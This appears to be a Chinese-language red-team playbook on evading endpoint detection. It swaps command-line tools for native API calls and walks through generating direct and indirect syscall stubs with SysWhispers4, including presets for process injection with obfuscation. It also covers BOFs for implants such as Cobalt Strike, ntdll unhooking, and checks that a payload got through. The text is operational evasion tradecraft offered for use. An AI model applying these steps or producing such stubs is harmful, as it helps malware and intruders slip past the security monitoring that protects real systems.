# Native API / SysWhispers4 / BOF

高噪声经常来自 `cmd.exe` / `powershell.exe` / 命令行，而不是功能本身。把原动作改成 in-process Native API 或 syscall stub。

Syscall **不是** “绕过所有 EDR”。它绕的是 **ntdll 用户态 hook**。kernel callback、ETW-TI、call stack、内存扫描仍然在。

---

## 1. 先降命令行

```text
whoami          → OpenProcessToken + GetTokenInformation
ipconfig        → GetAdaptersAddresses
netstat         → GetExtendedTcpTable
arp             → GetIpNetTable2
net session     → NetSessionEnum
reg query       → RegOpenKeyEx / RegQueryValueEx
nslookup        → DnsQuery_W
dir / copy      → NtQueryDirectoryFile / CopyFileEx
```

能用 Win32/COM 就先用。只有确认 user-mode hook 是阻断点时才上 syscall。

---

## 2. SysWhispers4

官方：https://github.com/JoasASantos/SysWhispers4

```bash
git clone https://github.com/JoasASantos/SysWhispers4.git
cd SysWhispers4
python3 syswhispers.py --list-presets
python3 syswhispers.py --list-functions

# 内存/线程常用
python3 syswhispers.py --preset common --arch x64 --compiler msvc -o SW4Syscalls

# 注入
python3 syswhispers.py --preset injection --method indirect --resolve tartarus --arch x64

# 间接 + 从 KnownDlls 解析 SSN
python3 syswhispers.py --functions NtAllocateVirtualMemory,NtProtectVirtualMemory,NtCreateThreadEx,NtWriteVirtualMemory \
  --method indirect --resolve from_disk --obfuscate --arch x64
```

Invocation：

```text
embedded     直接 syscall 指令。ntdll hook 绕过最干净，return address 不在 ntdll，栈异常更明显
indirect     jmp ntdll 的 syscall;ret gadget
randomized   每次随机 gadget
egg          运行时替换 egg，静态看不到 syscall 字节
```

SSN resolve：

```text
freshycalls  按 ntdll 导出地址排序（默认，抗部分 hook）
tartarus     处理近/远 JMP hook
from_disk    KnownDlls 干净 ntdll
recycled     FreshyCalls + opcode 校验，通常最稳
hw_breakpoint VEH 抽 SSN
```

生成文件按当前 README 链接进 loader。以 `-h` 为准，不要套 SysWhispers3 参数。

覆盖：x64 / x86 / WoW64 / ARM64，syscall 表到 Windows 11 24H2。

---

## 3. 直接 vs 间接

```text
Direct   → 少经过 ntdll hook，栈异常
Indirect → 从 ntdll gadget 进内核，栈更像正常调用
```

如果 EDR 拦的是 **调用栈** 而不是 hook，去 `callstack-telemetry.md`，不要只换 SSN 解析。

---

## 4. BOF / COFF

已有 Cobalt Strike / Sliver / Havoc 等支持 BOF 的 implant：

```text
不拉起 cmd.exe
in-process 原生 API
功能切小，避免在 agent 主线程上长时间阻塞
不依赖 CRT
显式声明导入
```

把“原被拦的动作”做成一个 BOF，而不是再 drop 一个 exe。

---

## 5. Unhook ntdll

从磁盘或 `\KnownDlls\ntdll.dll` 映射干净 `.text`，覆盖当前进程被 patch 的 ntdll。SysWhispers4 `--unhook-ntdll` 会生成 `SW4UnhookNtdll()`，在 `SW4Initialize()` 之前调用。

Kernel hook / 回调不受影响。

---

## 6. 成功判断

```text
Before: 同一 API 在 ntdll 被 hook 时失败或进程被杀
After : stub 调用返回成功，payload 继续
仍失败: 看 call stack / kernel / memory，不要无限换 syscall 框架
```
